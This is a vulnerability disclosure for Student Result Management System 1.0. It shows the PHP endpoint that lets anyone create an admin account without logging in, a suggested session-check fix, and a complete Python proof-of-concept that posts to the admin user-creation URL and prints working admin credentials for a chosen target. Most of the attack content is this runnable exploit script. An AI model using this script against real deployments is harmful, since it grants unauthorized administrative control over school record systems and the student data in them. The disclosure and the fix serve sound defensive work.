### Overview
The Student Result Management System 1.0 contains a critical vulnerability that allows unauthenticated creation of admin users, enabling attackers to gain administrative access without prior credentials. Discovered by Gabriel Felipe of Plaintext Cybersecurity Solutions and tested on Ubuntu 24.04, this flaw affects version 1.0 of the application available on SourceCodester. No CVE has been assigned as of now.


#### Vulnerable PHP code
```php
<?php
chdir('../../');
session_start();
require_once('db/config.php');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

$fname = ucfirst($_POST['fname']);
$lname = ucfirst($_POST['lname']);
$email = $_POST['email'];
$gender = $_POST['gender'];
$role = '1';
$pass = password_hash($_POST['password'], PASSWORD_DEFAULT);
$status = '1';

try {
$conn = new PDO('mysql:host='.DBHost.';dbname='.DBName.';charset='.DBCharset.';collation='.DBCollation.';prefix='.DBPrefix.'', DBUser, DBPass);
$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

$stmt = $conn->prepare("SELECT email FROM tbl_staff WHERE email = ? UNION SELECT email FROM tbl_students WHERE email = ?");
$stmt->execute([$email, $email]);
$result = $stmt->fetchAll();
```


#### Suggessted fix
```php
// AUTH CHECK - Only allow logged-in users with a privileged level of acess
if (!isset($_SESSION['id']) || !isset($_SESSION['level']) || $_SESSION['level'] != '0') {
    $_SESSION['reply'] = array(array("error", "Unauthorized access."));
    header("location:../");
    exit;
}
```

```python
#!/usr/bin/python3
import argparse
import requests
import random
import string
from threading import Thread

'''Proxy SetUp'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()


def create_user(target):
    url = 'http://' + target + '/srms/admin/core/new_user'
    user_string = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(3))
    username = 'admin_' + user_string + '@watskip.local'
    password = 'Password123!' + user_string
    data = {
        'fnmae': 'Admin_' + user_string,
        'lname': 'new' + user_string,
        'gender': 'Male',
        'email': username,
        'password': password
    }
    response = requests.post(url, data=data, proxies=proxies)
    if response.status_code == 200:
        print('[+] Success.')
        return username, password
    else:
        print('User not created.')
        exit(1)


def parse_args():
    parser = argparse.ArgumentParser(description='SRMS - PoC Create an admin user.')
    parser.add_argument('-t', '--target', help='Target IP address or hostname', required=True)
    return parser.parse_args()

def main():
    args = parse_args()
    print(f"Target: {args.target}")
    print('You can log in with the following credentials:', create_user(args.target))

if __name__ == '__main__':
    main()

```    
